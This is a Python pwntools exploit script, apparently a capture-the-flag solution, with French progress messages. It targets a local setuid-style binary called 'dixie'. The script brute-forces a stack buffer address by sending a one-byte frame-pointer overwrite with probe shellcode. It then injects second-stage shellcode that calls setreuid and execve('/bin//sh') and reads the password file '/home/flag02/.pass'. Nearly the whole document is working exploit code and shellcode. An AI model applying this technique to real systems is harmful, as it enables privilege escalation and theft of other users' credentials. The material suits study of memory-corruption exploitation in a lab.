#!/usr/bin/env python3
from pwn import *
import sys

BINARY = "./dixie"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"

probe_sc = asm(
    "push 0x0a544948;"
    "mov rsi, rsp;"
    "push 1; pop rdi;"
    "push 4; pop rdx;"
    "push 1; pop rax;"
    "syscall;"
    "push 60; pop rax;"
    "syscall;"
)

def build_payload(buf_addr, blob):
    target = buf_addr - 0x800
    stub = asm(
        "xor eax, eax;"
        "mov rsi, rbp;"
        "xor edi, edi;"
        f"push {len(blob)}; pop rdx;"
        "syscall;"
        "jmp rsi;"
    )
    assert len(stub) <= 16
    assert 16 + len(blob) <= 64
    payload = p64(target) + p64(buf_addr + 16) + stub
    payload = payload.ljust(64, b"\x90") + p8(buf_addr & 0xff)
    assert len(payload) == 65
    return payload

def try_addr(buf_addr, shellcode):
    if ((buf_addr + 0x40) >> 8) != (buf_addr >> 8):
        return False, b""
    payload = build_payload(buf_addr, shellcode)
    io = process(BINARY)
    try:
        io.sendafter(b"Ready: ", payload, timeout=1)
        io.send(shellcode)
        data = io.recvall(timeout=0.4)
        return True, data
    except Exception:
        return False, b""
    finally:
        io.close()

print("[*] Phase 1/2 : calibration de buf_addr...", flush=True)
FOUND = None
lo, hi, step = 0x7ffffffd0000, 0x7ffffffff000, 0x10
addr = hi - step
count = 0
while addr >= lo:
    ok, data = try_addr(addr, probe_sc)
    if ok and b"HIT" in data:
        FOUND = addr
        print(f"[+] buf_addr = {hex(addr)}", flush=True)
        break
    count += 1
    if count % 500 == 0:
        print(f"    ... {count} testees, dernier essai {hex(addr)}", flush=True)
    addr -= step

if FOUND is None:
    print("[-] aucune adresse trouvee", flush=True)
    sys.exit(1)

print("[*] Phase 2/2 : setreuid + execve('/bin//sh')...", flush=True)
stage2 = asm(
    "push 0x6b; pop rax; syscall;"
    "mov rdi, rax; mov rsi, rax;"
    "push 0x71; pop rax; syscall;"
    "xor rsi, rsi; push rsi;"
    "movabs rdi, 0x68732f2f6e69622f;"
    "push rdi; mov rdi, rsp;"
    "push rsi; push rdi; mov rsi, rsp;"
    "xor edx, edx;"
    "push 0x3b; pop rax; syscall;"
)
assert len(stage2) <= 64

payload = build_payload(FOUND, stage2)
io = process(BINARY)
io.sendafter(b"Ready: ", payload)
io.send(stage2)
try:
    io.recvuntil(b"session closed.", timeout=3)
except Exception:
    pass
io.sendline(b"id")
io.sendline(b"cat /home/flag02/.pass")
out = io.recvall(timeout=3)
print(out.decode(errors="replace"), flush=True)

if b"flag02" in out:
    print("[+] flag02, mot de passe affiche ci-dessus", flush=True)
else:
    print("[-] echec, voir sortie ci-dessus", flush=True)